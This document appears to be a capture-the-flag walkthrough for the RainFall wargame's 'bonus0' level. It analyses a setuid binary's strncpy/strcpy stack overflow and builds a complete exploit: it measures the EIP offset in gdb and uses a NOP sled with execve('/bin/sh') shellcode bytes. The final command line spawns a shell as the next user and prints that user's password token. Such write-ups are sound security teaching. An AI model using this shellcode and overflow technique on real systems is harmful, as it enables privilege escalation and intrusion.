# Bonus0 Walkthrough

## Who am I?

```bash
bonus0@RainFall:~$ id
uid=2010(bonus0) gid=2010(bonus0) groups=2010(bonus0),100(users)
```

## Where am I?

```
-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0*
# note: the `s` bits indicate setuid/setgid, the binary runs with the owner's privileges (here `bonus1`) when executed by another user (here `bonus0`).
```

---

## Discovery, behavior test


```bash
bonus0@RainFall:~$ ./bonus0
 -
hello
 -
world
hello world
```

**Observation**: The program prints back a string that looks like the concatenation of both inputs separated by a space.

---

## Function analysis

```c
#include <stdlib.h>
#include <string.h>

char	*p(char *s, char *str)
{
	char	buffer[4096];

	puts(str);
	read(0, buffer, 4096);
	*strchr(buffer, '\n') = 0;
	return (strncpy(s, buffer, 20));
}

char	*pp(char *buffer)
{
	char		b[20];
	char		a[20];
	unsigned int	len;

	p(a, " - ");
	p(b, " - ");
	strcpy(buffer, a);
	len = strlen(buffer);
	buffer[len] = ' ';
	buffer[len + 1] = 0;
	return (strcat(buffer, b));
}

int	main(void)
{
	char	buffer[42];

	pp(buffer);
	puts(buffer);
	return (0);
}
```

* `p(char *s, char *str)`

  * allocates a large local buffer (4096 bytes) on the stack.
  * prints the prompt string `str`.
  * performs `read(0, buffer, 4096)` then replaces `\n` with `\0`.
  * calls `strncpy(s, buffer, 20)` and returns `s`.
  * **Implication :** if the line read has >=20 bytes, `s` receives 20 bytes but may not be null-terminated.

* `pp(char *buffer)`

  * defines `a[20]` then `b[20]` as local arrays.
  * calls `p(a, " - ")` then `p(b, " - ")`.
  * does `strcpy(buffer, a)`, computes `len = strlen(buffer)`, sets `buffer[len] = ' '`, then `strcat(buffer, b)`.
  * **Implication :** `strcpy(buffer, a)` will keep copying bytes past `a` until a `\0` is found that `\0` may lie inside `b` or beyond, producing a much longer string than 20 bytes.

* `main()`

  * allocates `buffer[42]` and calls `pp(buffer)`.
  * `buffer[42]` is the place where the concatenated string ends up and where overflow is observed.

**Conclusion** : p() reads up to 4096 bytes into a local buffer and then does strncpy(s, buffer, 20). If the first input is ≥20 bytes, s may not be NUL‑terminated.

pp() holds a[20] and b[20], then calls strcpy(buffer, a), adds a space and b so when a lacks \0, strcpy continues into b.

The effective string copied into main buffer[42] can therefore be a + b + ' ' + b, up to 61 bytes (40 + 1 + 20).

Because main buffer is 42 bytes, up to 19 bytes can overwrite stack control data (saved EBP / return address). Exact byte offset that reaches EIP must be measured on the target.

Exploit idea: place NOP‑sled + shellcode via the large p() read (first input), then craft b so that at the measured offset it contains a little‑endian return address into the sled; strcpy/strcat will then overwrite the return address and jump to your shellcode.

---

## Build the exploit

### 1) Confirm the EIP overwrite offset

* Create cyclic pattern and crash under gdb:

```bash
msf-pattern_create -l 200 > /tmp/patt
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 
01234567890123456789
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
(gdb) 


# in gdb after crash: get EIP value
msf-pattern_offset -q 0x41336141
[*] Exact match at offset 9
```

* Compute global offset: offset_in_b is 9, so global_offset = 20 + 9 = 29 (index in the concatenated string that overwrites the first byte of EIP).

### 2) Find the big local buffer address (where we can place shellcode)

* Set a breakpoint in `p()` where the large buffer is set up (0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax) and run to get the stack address:

```gdb
disas p
b *p+28
run
# at breakpoint
p $ebp-0x1008
$1 = (void *) 0xbfffe680
(gdb) p/x 0xbfffe680 + 100
$2 = 0xbfffe6e4
```

* Choose any address in [start, start+L-1]; prefer the middle ret_addr = start + L//2.
For L = 200 and start = 0xbfffe680 → ret_addr = 0xbfffe680 + 100 = 0xbfffe6e4 (little-endian bytes: \xe4\xe6\xff\xbf).

### 3) Build payloads

* **First input (a)**: place a NOP sled + shellcode. Keep total length >=20 so strncpy writes 20 bytes (non-null-terminated) and the heap/p stack contains the full sled.

**Shellcode (28 bytes)**: execve("/bin//sh") — source: [https://shell-storm.org/shellcode/files/shellcode-811.html](https://shell-storm.org/shellcode/files/shellcode-811.html)

```bash
payload1 = NOP sled * 200 + shell
payload1 = "\x90" * 200 + \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```

* **Second input (b)**: craft padding to reach the overwrite position inside `b` then write the return address (little-endian) and optional trailing filler.

If offset_in_b = 9 and saved EIP begins at global index 29:

```bash
payload2 = "A" * offset_in_b + ret_addr + "B" * 7
payload2 = "A" * 9 + "\xe4\xe6\xff\xbf" + "B" * 7
```

* **Final Payload**:

```bash
bonus0@RainFall:~$ (python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xe4\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
 - 
 - 
��������������������AAAAAAAAA����BBBBBBB��� AAAAAAAAA����BBBBBBB���
id
uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

```

## **Files in this repository**

* `flag.txt`: file containing the retrieved flag
* `source/`: contains `ghidra/` (raw Ghidra decompilation) and `clean/` (cleaned C, faithful to binary)

---

## Conclusion

The binary is exploitable due to a large stack read followed by a non-null-terminated strncpy and subsequent strcpy/strcat of adjacent locals, allowing a return-address overwrite. Using a cyclic pattern and GDB we found the EIP overwrite at global index 29 (offset 9 in b), placed a NOP sled + shellcode in p()’s large buffer and overwrote the return address to jump into it.

